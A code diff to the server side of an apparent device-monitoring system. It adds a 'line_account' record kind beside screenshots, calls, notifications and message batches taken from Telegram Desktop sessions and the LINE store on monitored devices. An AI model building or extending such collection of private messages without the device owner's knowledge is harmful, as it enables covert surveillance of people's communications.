@@ -32,8 +32,8 @@ import { Bucket, TooLargeError, type ObjectEntry } from "../r2/client.ts";
 import { sha256Hex, writeFileAtomic } from "../util/fsx.ts";
 import { msOf, nowIso } from "../util/time.ts";
 import {
-  commitAndroidNotification, commitCall, commitCommandStatus, commitDeviceReport, commitFileMeta, commitMessageBatch,
-  commitScreenshot, commitUsage, commitWindowsNotification, type CommitResult,
+  commitAndroidNotification, commitCall, commitCommandStatus, commitDeviceReport, commitFileMeta, commitLineAccount,
+  commitMessageBatch, commitScreenshot, commitUsage, commitWindowsNotification, type CommitResult,
 } from "./committers.ts";
 import {
   committedSet, finalizeBlob, getBlob, markPartCommitted, noteAwaitingManifest, openManifest, placeAndLink,
@@ -43,7 +43,7 @@ import { acceptDeviceRecord, expireStalePairings, finishPairing } from "../pairi
 import { deleteCommandObject, maintainCommands, sendQueued } from "../commands/commands.ts";
 
 /** Record prefixes listed incrementally (PROTOCOL §5). */
-const RECORD_PREFIXES = ["file", "scr", "usg", "wnotif", "anotif", "call", "msg", "cstat", "status", "blob"];
+const RECORD_PREFIXES = ["file", "scr", "usg", "wnotif", "anotif", "call", "msg", "lineacct", "cstat", "status", "blob"];
 const RECORD_PREFIX_PATHS = RECORD_PREFIXES.map((p) => `up/${p}/`);
 const PREFETCH = 16; // objects fetched from R2 concurrently during a pass; commit stays sequential
 
@@ -86,12 +86,13 @@ const COMMITTERS: Partial<Record<Kind, (db: Ctx["db"], rec: never) => CommitResu
   message_batch: commitMessageBatch as never,
   device_report: commitDeviceReport as never,
   command_status: commitCommandStatus as never,
+  line_account: commitLineAccount as never,
 };
 
 /** Kinds a device may send in each role's bucket. Android kinds are accepted from Android only, and so on. */
 const ALLOWED: Record<Role, Set<string>> = {
   // message_batch from Windows: Telegram Desktop session, LINE for Windows store (PRD WT1-WT4, WL1-WL3)
-  windows: new Set(["file_meta", "screenshot", "usage_event", "windows_notification", "message_batch", "device_report", "command_status"]),
+  windows: new Set(["file_meta", "screenshot", "usage_event", "windows_notification", "message_batch", "line_account", "device_report", "command_status"]),
   android: new Set(["file_meta", "screenshot", "usage_event", "android_notification", "call", "message_batch", "device_report", "command_status"]),
 };
 
